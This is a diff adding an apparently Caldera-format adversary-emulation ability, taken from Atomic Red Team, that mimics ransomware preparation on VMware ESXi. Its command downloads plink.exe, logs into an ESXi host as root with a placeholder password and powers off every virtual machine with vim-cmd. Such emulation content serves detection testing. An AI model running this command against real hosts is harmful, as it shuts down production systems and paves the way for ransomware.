@@ -1,0 +1,66 @@
+- id: 622cc1a0-45e7-428c-aed7-c96dd605fbe6
+  name: ESXi - vim-cmd Used to Power Off VMs
+  description: 'Adversaries may power off VMs to facilitate the deployment of ransomware
+    payloads.
+
+    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#power%20off%20vm)'
+  tactic: impact
+  technique:
+    attack_id: T1529
+    name: System Shutdown/Reboot
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\plink.exe")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\plink.exe"; fi; echo ""
+          | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local"
+          -ssh -l root -pw "password" "for i in `vim-cmd vmsvc/getallvms | awk ''NR>1
+          {print $1}''`; do vim-cmd vmsvc/power.off $i & done"'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - impact
+  - t1529
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      vm_host:
+        description: Specify the host name or IP of the ESXi server.
+        type: string
+        default: atomic.local
+      vm_user:
+        description: Specify the privilege user account on the ESXi server.
+        type: string
+        default: root
+      vm_pass:
+        description: Specify the privileged user's password.
+        type: string
+        default: password
+      plink_file:
+        description: Path to Plink
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
+    dependencies:
+    - description: 'Check if we have plink
+
+        '
+      prereq_command: 'if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
+        -OutFile "#{plink_file}"
+
+        '
+    technique_created: '2019-10-04T20:42:28.541Z'
+    atomic_guid: 622cc1a0-45e7-428c-aed7-c96dd605fbe6
+    import_timestamp: '2025-06-24T11:15:07.841455Z'
